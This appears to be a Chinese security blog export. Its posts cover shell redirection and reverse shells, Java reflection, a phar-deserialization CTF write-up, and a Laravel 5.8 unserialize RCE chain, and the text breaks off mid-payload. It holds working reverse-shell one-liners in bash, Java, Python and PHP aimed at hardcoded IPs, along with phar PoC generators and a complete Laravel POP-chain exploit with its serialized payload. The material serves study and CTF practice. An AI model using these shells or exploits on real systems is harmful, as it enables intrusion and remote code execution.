    <content type="text"><![CDATA[做题目遇到了，就去查了一些这方面的资料，总结一下。 文件描述符与重定向文件描述符 文件描述符是一个非负整数，它指向一个打开的文件，可以理解为指针指向打开的文件，但它并不是指针 实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。一般适用于 Linux 和 Unix 系统 也可以理解为文件的身份 ID，用于表明每个被进程打开的文件 每一个文件描述符会与一个打开文件相对应，同时，不同的文件描述符也会指向同一个文件 一般情况下，Linux 下的三个默认文件描述符如下 : 0 表示标准输入，只读 1 表示标准输出，只写 2 表示标准错误输出，只写 程序刚刚启动的时候，0 是标准输入，1 是标准输出，2 是标准错误输出。如果此时去打开一个新的文件，它的文件描述符会是 3 在 Linux 中，一切都是文件，键盘显示器设备都是文件，它们的输入输出也由文件描述符控制 重定向 重定向主要有两种 : 输入重定向 &lt; : 对 0 重定向 输出重定向 &gt; : 对 1 重定向 bash 在执行一条指令时，首先会处理重定向符号 如果指令中存在多个重定向，那么它的解析顺序是从左向右 输入重定向( &lt; )例子如下，首先解析器会先解析重定向，将标准输入指向 file，这时再使用 cat 从标准输入读取时，就会读取 file 输出重定向( &gt; )例子如下，首先解析器会先解析重定向，将标准输出指向 file，这时使用 echo 输入字符串，就会直接输入到 file 中 标准输出与标准错误输出重定向( &amp;&gt; )例子如下，首先，执行一个错误的命令，可以看到，错误输出到了 file 中，后面执行一个正确的命令，结果也输出到了 file 中。这两个命令等价于 mkdir 1&gt; file 2&gt;&amp;1 和 ls 1&gt; file 2&gt;&amp;1 0、1、2 是默认的文件描述符，其之后的可以自行使用，例子如下，创建文件描述符 3 并指向 file，然后 cat 读取 还有一种重定向，&lt;&gt; 表示同时对文件进行读写，例子如下。以读写模式打开 file 同时将文件描述符 6 指向 file，然后 cat 读取 反弹 shell什么是反弹 shell 就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。其本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因防火墙受限、权限不足、端口被占用等情形。 假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web 服务，ssh，telnet 等等，都是正向连接。 那么什么时候使用反弹 shell 呢？ 靶机中了你的网马，但是它在局域网内，直接连接不了 靶机的 IP 会动态改变，不能持续控制 由于防火墙等限制，靶机只能发送请求，不能接收请求 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策 所谓反弹 shell，就是受害者连接攻击者指定的服务端，从而使攻击者 getshell 举个例子，靶机 : 192.168.233.132，攻击者 : 192.168.233.130，在攻击者上执行 nc -lvp 4096 监听 4096 端口，在靶机上执行 bash -i &gt;&amp; /dev/tcp/192.168.233.130/4096 0&gt;&amp;1，将会有如下界面 : 反弹 shell 分析 bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 bash -i 创建一个交互式 bash 进程 /dev/tcp/ip/port 与 IP:port 建立一个 TCP 连接 这里相当于 bash -i 1&gt; /dev/tcp/ip/port 2&gt;&amp;1 先将文件描述符 1 重定向到 /dev/tcp/ip/port ，然后再将文件描述符 2 重定向到 /dev/tcp/ip/port 0&gt;&amp;1 将文件描述符 0 重定向到 /dev/tcp/ip/port 最终所有的标准输入输出都在这个文件中，很明显完成了反弹 shell bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5 5&lt;&gt;/dev/tcp/host/port 以读写方式打开 /dev/tcp/host/port，并将文件描述符重定向到 /dev/tcp/host/port 0&gt;&amp;5 文件描述符 0 重定向到 5 1&gt;&amp;5 文件描述符 1 重定向到 5 最终文件描述符 0 和 1都重定向到 /dev/tcp/host/port 完成 反弹 shell exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line &gt;&amp;5; done exec 5&lt;&gt;/dev/tcp/host/port 以读写方式打开 /dev/tcp/host/port，并将文件描述符重定向到 /dev/tcp/host/port cat &lt;&amp;5 将文件描述符 5 重定向到 cat 中，即 cat 读取 &amp;5 的内容，也即 cat 读取 /dev/tcp/host/port 中的内容 | 将 cat 读取的结果作为后面的输入 while read line; do $line &gt;&amp;5; done 循环读取 cat &lt;&amp;5 中的内容，赋值给 line，然后 $line 执行 line，最后 &gt;&amp;5 表示将 bash 的输出和错误重定向到文件描述符 5 中，即 /dev/tcp/host/port 中 Java 反弹 shell 基本方式 1Runtime.getRuntime().exec(new String[]&#123;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"&#125;).waitFor(); 或者 1Runtime.getRuntime().exec(new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;).waitFor(); /bin/bash 是需要运行的程序，-c 和 bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 都是作为 /bin/bash 的参数。bash -c &quot;cmd string&quot; 意为 shell 运行 cmd string，所以上述代码就是利用 shell 运行 bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 python 反弹 shell1234567import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("192.168.31.41",8080))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"]) PHP 反弹 shell12$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 反射机制]]></title>
    <url>%2F2019%2F09%2F10%2FJava%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[关于 Java 反射的一些基础知识，有待补充 Class 概述 反射允许我们在运行时发现和使用类的信息 类型信息在运行时由被称为 Class 对象的特殊对象表示，它包含了与类有关的信息 Class 对象就是用来创建类的所有的常规对象的 类是程序的一部分，每个类都有一个 Class 对象。每当编写并编译了一个新类，就会产生一个Class 对象，即被保存在一个同名的 .class 文件中。为了生成这个类的对象，运行这个程序的 Java 虚拟机将使用被称为 “类加载器” 的子系统。 所有的类都是在对其第一次使用时，动态加载到 JVM 中的。当程序创建第一个对类的静态成员引用时，就会加载这个类。在使用 new 创建类的新对象时，也会被当做对类的静态成员的引用。 Java 程序在其开始运行之前并非被完全加载，其各个部分是在必须时才加载的。这就是它的动态加载机制。 类加载器首先检查这个类的 Class 对象是否已经加载，如果尚未加载，默认的类加载器会根据类名查找 .class 文件。一旦某个类的 Class 对象被加载到内存，它就被用来创建这个类的所有对象。 以下面这段代码为例 : 12345678910111213141516171819202122232425262728293031323334353637383940import static net.mindview.util.Print.*;class Candy &#123; static &#123; print(" loading Candy"); &#125;&#125;class Gum &#123; static &#123; print(" loading Gum "); &#125;&#125;class Cookie &#123; static &#123; print(" loading Cookie "); &#125;&#125;public class hello &#123; public static void main(String[] args) &#123; print(" inside main "); new Candy(); new Candy(); print(" after create Candy "); try &#123; Class.forName("Gum"); &#125; catch (ClassNotFoundException e)&#123; print(" cannot find Gum "); &#125; print(" after Class.forName(\"Gum\") "); new Cookie(); print(" after create Cookie "); &#125;&#125;/* 输出 inside main loading Candy after create Candy loading Gum after Class.forName("Gum") loading Cookie after create Cookie /* 以上类中的 static 子句在类第一次被加载时执行。Class 对象仅在被需要时加载 对于 forName 函数，它是 Class 类的一个 static 成员，所有的 Class 对象都属于这个类。Class 对象和其他对象一样，我们可以获取并操作它的引用( 也就是类加载器的工作 )。forName 是取得 Class 对象的引用的一种方法，它是以类名的 string 作为参数，返回一个 Class 对象的引用，如果被引用类没有加载就加载该类。 getClass 函数用来获取 Class 引用，它将返回表示该对象的实际类型的 Class 引用，即已知实例化对象获取类引用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import static net.mindview.util.Print.*;interface HasBatteries &#123;&#125;interface Waterproof &#123;&#125;interface Shoots&#123;&#125;class Toy &#123; Toy() &#123;&#125; Toy(int i) &#123;&#125;&#125;// FancyToy 继承 Toy 并且继承三个接口class FancyToy extends Toy implements HasBatteries, Waterproof, Shoots &#123; FancyToy() &#123; super(1); &#125;&#125;public class hello &#123; static void printInfo(Class cc) &#123; print("Class name : " + cc.getName() + " is interface? [" + cc.isInterface() + "]"); print("Simple name : " + cc.getSimpleName()); print("Canonical name : " + cc.getCanonicalName()); &#125; public static void main(String[] args) &#123; Class c = null; try &#123; c = Class.forName("FancyToy"); &#125; catch (ClassNotFoundException e) &#123; print("FancyToy was not found"); System.exit(1); &#125; printInfo(c); for(Class face : c.getInterfaces()) &#123; printInfo(face); &#125; // 获取 c 的父类 Class up = c.getSuperclass(); Object obj = null; try &#123; // 实例化 up 的对象 obj = up.newInstance(); &#125; catch (InstantiationException e) &#123; print("cannot instance"); System.exit(1); &#125; catch (IllegalAccessException e) &#123; print("cannot access"); System.exit(1); &#125; // 获取 Class 对象 printInfo(obj.getClass()); &#125;&#125;/*输出Class name : FancyToy is interface? [false]Simple name : FancyToyCanonical name : FancyToyClass name : HasBatteries is interface? [true]Simple name : HasBatteriesCanonical name : HasBatteriesClass name : Waterproof is interface? [true]Simple name : WaterproofCanonical name : WaterproofClass name : Shoots is interface? [true]Simple name : ShootsCanonical name : ShootsClass name : Toy is interface? [false]Simple name : ToyCanonical name : Toy*/ 反射概述 Class 类与 java.lang.reflect 类库一起构成了对 “反射” 的支持，该类库包含了 Field, Method 和 Constructor 类。这些类型的对象是由 JVM 在运行时创建的，用以表示未知类里对应的成员。这样就可以使用 Constructor 创建新的对象，用 get() 和 set() 函数读取和修改与 Filed 对象关联的字段，用 invoke() 方法调用与 Method 对象关联的方法。 当通过反射与一个未知类型的对象打交道时，JVM 只是简单地检查这个对象，看它属于哪个特定类。在用它做其他事情之前加载那个类的 Class 对象。因此，那个类的 .class 文件对于 JVM 来说必须是可获得的。对于反射机制来说，.class 文件在编译时不可获取，所以在运行时打开和检查 .class 文件 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性 反射就是把 Java 类中的内容视为 Java 对象。例如：一个类有：成员变量、方法、构造方法、包等等信息，利用反射技术可以对一个类进行解剖，把每个组成部分映射成一个个对象。 以下面代码为例，反射的含义 12345678910111213import static net.mindview.util.Print.*;class Person &#123;&#125;public class hello &#123; public static void main(String[] args) &#123; // 正向 : 由类到实例化对象 Person person = new Person(); // 反向 : 由实例化对象到类，这里就意味着反射 print(person.getClass().getName()); &#125;&#125;// 输出 Person 以下面代码为例，如何实现反射及反射的利用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import static net.mindview.util.Print.*;class Person &#123; private void hello() &#123; print("hell Person"); &#125;&#125;public class hello &#123; public static void main(String[] args) &#123; String s = "peri0d"; print(s); print(s.getClass()); print(s.getClass().getName()); Person person = new Person(); print(person.getClass()); print(person.getClass().getName()); Class c = null; try &#123; c = Class.forName("Person"); &#125; catch (ClassNotFoundException e) &#123; print("Class Not Found"); System.exit(1); &#125; Object obj = null; try &#123; obj = c.newInstance(); &#125; catch (InstantiationException e) &#123; print("cannot instance"); &#125; catch (IllegalAccessException e) &#123; print("cannot access"); &#125; Method met = null; try &#123; met = obj.getClass().getDeclaredMethod("hello", null); // 赋予权限 met.setAccessible(true); &#125; catch (NoSuchMethodException e) &#123; print("No Such Method"); &#125; try &#123; met.invoke(obj, null); &#125; catch (IllegalAccessException e) &#123; print("cannot access"); &#125; catch (InvocationTargetException e) &#123; print("cannot invocate target"); &#125; &#125;&#125;/*输出peri0dclass java.lang.Stringjava.lang.Stringclass PersonPersonhell Person*/ 反射实现 实例化对象的 getClass() 方法 1234String s = "peri0d";print(s); // peri0dprint(s.getClass()); // class java.lang.Stringprint(s.getClass().getName());// java.lang.String forName() 方法调用 123class Person &#123;&#125;Class c = Class.forName("Person"); // 反射 Person 类Object obj = c.newInstance(); // 反射 Person 类的实例化对象 .class 获取 12Class k = Person.class;print(k.getName()); // Person 反射属性 getField(String name) : 获得某个公有属性 getFields() : 获得所有公有属性 getDeclaredField(String name): 获得某个属性 getDeclaredFields(): 获得所有属性 get(Object obj) : 获取 obj 中的属性值 set(Object obj, Object value) : 设置 obj 中对应的属性值 反射方法 getMethod(String name, Class parameterTypes) : 获得该类某个公有方法 getMethods() : 获得该类所有公有方法 getDeclaredMethod(String name, Class parameterTypes) : 获得该类某个方法 getDeclaredMethods() : 获得该类所有方法 invoke(Object obj, Object args) : 传递 object 对象及调用方法的参数 反射构造器 getConstructor(Class parameterTypes) : 获得该类中与参数类型匹配的公有构造方法 getConstructors() : 获得该类的所有公有构造方法 getDeclaredConstructor(Class parameterTypes) : 获得该类中与参数类型匹配的构造方法 getDeclaredConstructors() : 获得该类所有构造方法 newInstance(Object initargs) : 根据传递的参数创建类的对象]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phar 反序列化小结]]></title>
    <url>%2F2019%2F08%2F22%2Fphar%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[初次接触 phar 反序列化，看到 ph 牛圈子以前以本题为例讨论过这个知识点，学习一下 题目 http://117.50.3.97:8005/ hitcon2017 的 baby^h-master-php-2017 Dockerfile 思路分析 判断 cookie 中是否含有 session-data ，没有就赋值为 $data-----$hmac，其中 $data 为 User 类序列化后的字符串， $hmac 为 $data 以 $SECRET 为密钥，进行 sha1 加密后的字符串 1234567891011121314$SANDBOX = "/var/www/data/".md5("orange".$_SERVER["REMOTE_ADDR"]);if (!isset($_COOKIE["session-data"])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac("sha1", $data, $SECRET); setcookie("session-data", sprintf("%s-----%s", $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; $this-&gt;avatar = $path; &#125; &#125; 有个 check_session 函数，获取 session-data 中的 $data 和 $hmac，并进行三次判断 $data 和 $hmac 必须存在且均为字符串 hash_hmac(&quot;sha1&quot;, $data, $SECRET) 必须和 $hmac 相等 $data 反序列化后的结果必须含有 avatar 属性，这个 avatar 是一个路径。最终函数返回 avatar 12345678910111213function check_session() &#123; global $SECRET; $data = $_COOKIE["session-data"]; list($data, $hmac) = explode("-----", $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) die("Bye"); if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac) ) die("Bye Bye"); $data = unserialize($data); if ( !isset($data-&gt;avatar) ) die("Bye Bye Bye"); return $data-&gt;avatar; &#125; 获取 get 的参数赋值给 $mode ，如果 $mode 为 upload 则调用 upload(check_session())。这一段的意思就是获取主目录下的 avatar.gif 复制到 $SANDBOX 目录下 1234567function upload($path) &#123; $data = file_get_contents($_GET["url"]."/avatar.gif"); if (substr($data, 0, 6) !== "GIF89a") die("Fuck off"); file_put_contents($path."/avatar.gif", $data); die("Upload OK"); &#125; 如果 $mode 为 show 则调用 show(check_session())。将目录下的 avatar.gif 输出 123456function show($path) &#123; if ( !file_exists($path."/avatar.gif") ) $path = "/var/www/html"; header("Content-Type: image/gif"); die(file_get_contents($path."/avatar.gif"));&#125; 题目还给了一段代码，这里是可以通过反序列化构造出 Admin 对象然后触发析构函数，但是后面的 hash_hmac 函数无法绕过 1234567class Admin extends User &#123; function __destruct()&#123; $random = bin2hex(openssl_random_pseudo_bytes(32)); eval("function my_function_$random() &#123;"." global \$FLAG; \$FLAG();"."&#125;"); $_GET["lucky"](); &#125;&#125; phar 反序列化 phar 提供了将多个 php 文件合成一个 phar 文件的功能，类似于 java 中的 jar php 在解析 phar 文件的 Metadata 时可能会触发反序列化操作 phar 会默认注册 phar:// 协议，在用 phar:// 协议读取文件的时候会自动解析成 phar 对象，同时反序列化其中存储的 Metadata 信息 示例代码 12345678910&lt;?php// 生成 test.phar 文件，并将 php.ini 中的 phar.readonly 改为 off$phar = new Phar('test.phar', 0, 'test.phar');// 将字符串写入到 test.php 中$p['test.php'] = 'string';// 向 phar 中写入 meta-data$p-&gt;setMetadata(new User());// 可以理解为文件头的标识部分，前面内容不限，但是必须以 &lt;?php __HALT_COMPILER(); ?&gt; 结尾，否则无法识别为 phar 文件$p-&gt;setStub('xxxxx&lt;?php __HALT_COMPILER(); ?&gt;');?&gt; 本题 avatar.gif 的 poc 12345678910&lt;?phpclass Admin &#123; public $avatar = 'orz'; &#125; $p = new Phar(__DIR__.'/avatar.phar', 0);$p['file.php'] = 'idlefire';$p-&gt;setMetadata(new Admin());$p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');rename(__DIR__.'/avatar.phar', __DIR__.'/avatar.gif');?&gt; 另外两个知识点 构造好反序列化对象之后，可以进入 __distruct() 方法，其中执行了 $_GET[&quot;lucky&quot;]();，就相当于执行一个无参函数，本题的意思就是执行获取 flag 的函数 本题获取 flag 的函数是使用 create_function 创建，是一个匿名函数，无法使用 get_defined_functions() 获取函数名 匿名函数名字是 \x00lambda_%d 这个 %d 是一个 1 开始的递增数列，表示这是当前进程中第%d个匿名函数。 如果一个崭新的 PHP 进程，其第 1 个匿名函数就是 \x00lambda_1，所以只需要传入 lucky=%00lambda_1 即可。 但是实战中，因为有很多人做题，每个人访问一次网页，就会使 %d 加 1 ，所以我们并不知道自己访问时的这个 %d 是多少。 这就涉及到第三个考点，我们通过大量请求，使目标 Apache 难以同时处理这么多请求，所以以 Pre-fork 模式启动的 Apache 会启动新进程来处理这个请求。那么，新进程下 %d 就是以 1 重新开始的 write up https://www.jianshu.com/p/19e3ee990cb7 将生成的 gif 放到 vps 里 然后构造 url : ?m=upload&amp;url=http://xxx.xxx.xxx.xxx 将 文件上传 运行 Orange 的 fork 脚本 请求 ?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1 得到 flag 这里再次上传时，upload 中的 file_get_contents 触发 phar 反序列化，执行 $_GET[&quot;lucky&quot;](); 小结不必在意最后的 exp，只需要关注这些知识点即可。 了解 phar 反序列化 类似 $_GET[&quot;lucky&quot;](); 的沙盒，使用 get_defined_functions() 获取函数名直接执行 匿名函数函数名 加深印象的 phar 反序列化操作原文 : https://www.freebuf.com/articles/web/205943.html 生成 phar 文件 测试代码 123456789101112131415&lt;?php// phar_1.phpclass TestObeject&#123;&#125;$phar = new Phar('test.phar', 0, 'test.phar');$phar-&gt;startBuffering();$phar-&gt;setStub('xxxxx&lt;?php __HALT_COMPILER(); ?&gt;');$o = new TestObeject();$o-&gt;data = 'peri0d';$phar-&gt;setMetadata($o);$phar-&gt;addFromString('text.txt','test');$phar-&gt;stopBuffering();?&gt; 执行完毕后会生成一个 test.phar 文件，其中的 meta-data 是以序列化的形式出现的。那么 php 函数在对 phar 文件进行解析时，就必伴随着反序列化的操作 xxxxx&lt;?php __HALT_COMPILER(); ?&gt; 为 phar 文件首部，meta-data 序列化内容为 O:11:&quot;TestObeject&quot;:1:{s:4:&quot;data&quot;;s:6:&quot;peri0d&quot;;} 测试 phar 反序列化漏洞 漏洞代码 1234567891011&lt;?php// phar_2.phpclass TestObeject&#123; public function __destruct() &#123; echo $this-&gt;data; &#125;&#125;include('phar://test.phar');?&gt; 输出结果 1xxxxxperi0d 将 phar 伪造成其他格式的文件 测试代码 123456789101112131415&lt;?php// phar_3.phpclass TestObeject&#123;&#125;$phar = new Phar('test2.phar', 0, 'test2.phar');$phar-&gt;startBuffering();$phar-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');$o = new TestObeject();$o-&gt;data = 'peri0d';$phar-&gt;setMetadata($o);$phar-&gt;addFromString('text.txt','test');$phar-&gt;stopBuffering();?&gt; 结果 例子 index.html 前端上传页面 12345678&lt;html&gt;&lt;body&gt;&lt;form action="./upload_file.php" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" name="Upload" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload_file.php 判断文件类型并存储 123456789101112131415161718192021&lt;?phpif (($_FILES["file"]["type"]=="image/gif")&amp;&amp;(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.')+1))== 'gif') &#123; echo "Upload: " . $_FILES["file"]["name"]; echo "Type: " . $_FILES["file"]["type"]; echo "Temp file: " . $_FILES["file"]["tmp_name"]; if (file_exists("upload_file/" . $_FILES["file"]["name"])) &#123; echo $_FILES["file"]["name"] . " already exists. "; &#125; else &#123; move_uploaded_file($_FILES["file"]["tmp_name"], "upload_file/" .$_FILES["file"]["name"]); echo "Stored in: " . "upload_file/" . $_FILES["file"]["name"]; &#125; &#125;else &#123; echo "Invalid file,you can only upload gif"; &#125; evil.php 测试用的危险函数 12345678910&lt;?php$filename=$_GET['filename'];class AnyClass&#123; var $output = 'echo "peri0d";'; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); 构造 attack.php 生成攻击代码，访问该文件会生成一个 phar.phar 文件，然后将其后缀改为 .gif ，上传该 gif 文件 1234567891011121314151617181920&lt;?phpclass AnyClass&#123; var $output = 'echo "peri0d";'; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;$phar = new Phar('phar.phar',0,'phar.phar');$phar-&gt;startBuffering();$phar-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');$o = new AnyClass();$o-&gt;output = 'phpinfo();';$phar-&gt;setMetadata($o);$phar-&gt;addFromString('text.txt','test');$phar-&gt;stopBuffering(); 利用 evil.php 构造 payload : filename=phar://upload_file/phar.gif]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>phar</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel 5.8 RCE 分析]]></title>
    <url>%2F2019%2F08%2F14%2FLaravel%205.8%20RCE%2F</url>
    <content type="text"><![CDATA[原帖地址 : https://xz.aliyun.com/t/6059 Laravel 代码审计 环境搭建 composer create-project --prefer-dist laravel/laravel laravel58 安装 Laravel 5.8 并生成 laravel58 项目 进入项目文件夹，使用 php artisan serve 启动 web 服务 在 laravel58/routes/web.php 文件添加路由 1Route::get("/","\App\Http\Controllers\DemoController@demo"); 在 laravel58/app/Http/Controllers/ 下添加 DemoController.php 控制器 1234567891011121314151617&lt;?phpnamespace App\Http\Controllers;class DemoController extends Controller&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); &#125; else&#123; highlight_file(__FILE__); &#125; return "Welcome to laravel5.8"; &#125;&#125; 漏洞分析 ph 牛的 payload : https://github.com/ambionics/phpggc/pull/61 从 Illuminate\Broadcasting\PendingBroadcast 类的 __destruct 方法开始的 pop 链 Illuminate\Broadcasting\PendingBroadcast 中，$events 必须实现 Dispatcher 接口，这里选择的是 Illuminate\Bus\Dispatcher 12345678910public function __construct(Dispatcher $events, $event)&#123; $this-&gt;event = $event; $this-&gt;events = $events;&#125;public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; Illuminate\Bus\Dispatcher 中，调用 dispatch 方法，进入 if 判断，$this-&gt;queueResolver 是在实例化 Illuminate\Bus\Dispatcher 时的一个参数，它必须有值，$command 也就是 $this-&gt;event 必须实现 ShouldQueue 接口，这里选择的就是 Illuminate\Broadcasting\BroadcastEvent 123456789101112131415161718192021// $command : $this-&gt;eventpublic function dispatch($command)&#123; if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123; return $this-&gt;dispatchToQueue($command); &#125; return $this-&gt;dispatchNow($command);&#125;public function __construct(Container $container, Closure $queueResolver = null)&#123; $this-&gt;container = $container; $this-&gt;queueResolver = $queueResolver; $this-&gt;pipeline = new Pipeline($container);&#125;protected function commandShouldBeQueued($command)&#123; return $command instanceof ShouldQueue;&#125; 到这里，构造出的 exp : 12345678910111213&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125;&#125;?&gt; 然后进入 dispatchToQueue 方法，存在 call_user_func 方法，其中的 $this-&gt;queueResolver 是可控的，这里利用的是 Mockery\Loader\EvalLoader 的 load 方法，即 $this-&gt;queueResolver 为 array(new Mockery\Loader\EvalLoader(), &quot;load&quot;) 12345678910111213141516public function dispatchToQueue($command)&#123; $connection = $command-&gt;connection ?? null; $queue = call_user_func($this-&gt;queueResolver, $connection); if (! $queue instanceof Queue) &#123; throw new RuntimeException('Queue resolver did not return a Queue implementation.'); &#125; if (method_exists($command, 'queue')) &#123; return $command-&gt;queue($queue, $command); &#125; return $this-&gt;pushCommandToQueue($queue, $command);&#125; 这个点的意思就是 $this-&gt;events 调用 dispatch 传入参数 $this-&gt;event 后 访问 $this-&gt;events 的 queueResolver 属性 调用 $this-&gt;events-&gt;commandShouldBeQueued($this-&gt;event) 方法 调用 dispatchToQueue 传入 $this-&gt;event 参数。其中的 $connection 为 $this-&gt;event-&gt;connection ，即 Illuminate\Broadcasting\BroadcastEvent 中的 $connection 属性 call_user_func 将 $connection 作为参数传给 $this-&gt;queueResolver 返回的函数 到这里，构造出的 exp 如下，已经实现 call_user_func($this-&gt;queueResolver, $connection) 即 call_user_func($evilFunc, $evilCode) ，接下来就要寻找一个可以利用的函数，这里选择的是 Mockery\Loader\EvalLoader ，继续跟进 123456789101112131415161718192021222324252627282930&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125; class BroadcastEvent &#123; public $connection; function __construct($evilCode) &#123; $this-&gt;connection = $evilCode; &#125; &#125;&#125;namespace Illuminate\Bus &#123; class Dispatcher &#123; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = $evilFunc; &#125; &#125;&#125; Mockery\Loader\EvalLoader 中有一个 eval 函数可以利用，这里的 $definition 是 MockDefinition 类的实例化对象，也就说明 $this-&gt;event-&gt;connection 是 MockDefinition 类的实例化对象。接下来就是绕过 if 判断。 1234567891011class EvalLoader implements Loader&#123; public function load(MockDefinition $definition) &#123; if (class_exists($definition-&gt;getClassName(), false)) &#123; return; &#125; eval("?&gt;" . $definition-&gt;getCode()); &#125;&#125; 跟进 Mockery\Generator\MockDefinition ，如果要绕过 if 判断，必须让 getClassName 返回一个不存在的类名，即 $this-&gt;config-&gt;getName() 返回一个不存在的类名。$config 为 Mockery\Generator\MockConfiguration 的实例化对象 1234567891011121314151617181920212223242526272829class MockDefinition&#123; protected $config; protected $code; public function __construct(MockConfiguration $config, $code) &#123; if (!$config-&gt;getName()) &#123; throw new \InvalidArgumentException("MockConfiguration must contain a name"); &#125; $this-&gt;config = $config; $this-&gt;code = $code; &#125; public function getConfig() &#123; return $this-&gt;config; &#125; public function getClassName() &#123; return $this-&gt;config-&gt;getName(); &#125; public function getCode() &#123; return $this-&gt;code; &#125;&#125; Mockery\Generator\MockConfiguration 中，让 getName() 返回一个不存在的类名，最终执行 eval(&quot;?&gt;&quot; . $definition-&gt;getCode()); 实现 RCE 123456789class MockConfiguration&#123; protected $name; public function getName() &#123; return $this-&gt;name; &#125;&#125; 最终的 exp ，(ph 牛的 exp ) : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125; class BroadcastEvent &#123; public $connection; function __construct($evilCode) &#123; $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode); &#125; &#125;&#125;namespace Illuminate\Bus &#123; class Dispatcher &#123; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), 'load']; &#125; &#125;&#125;namespace Mockery\Loader &#123; class EvalLoader &#123;&#125;&#125;namespace Mockery\Generator &#123; class MockDefinition &#123; protected $config; protected $code; function __construct($evilCode) &#123; $this-&gt;code = $evilCode; $this-&gt;config = new MockConfiguration(); &#125; &#125; class MockConfiguration &#123; protected $name = 'abcdefg'; &#125;&#125;namespace &#123; $code = "&lt;?php phpinfo(); exit; ?&gt;"; $exp = new \Illuminate\Broadcasting\PendingBroadcast($code); echo serialize($exp);&#125;?&gt; 构造输出结果 : 1O:40:"Illuminate\Broadcasting\PendingBroadcast":2:&#123;S:9:"\00*\00events";O:25:"Illuminate\Bus\Dispatcher":1:&#123;S:16:"\00*\00queueResolver";a:2:&#123;i:0;O:25:"Mockery\Loader\EvalLoader":0:&#123;&#125;i:1;S:4:"load";&#125;&#125;S:8:"\00*\00event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:&#123;S:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:&#123;S:9:"\00*\00config";O:35:"Mockery\Generator\MockConfiguration":1:&#123;S:7:"\00*\00name";S:7:"abcdefg";&#125;S:7:"\00*\00code";S:25:"&lt;?php phpinfo(); exit; 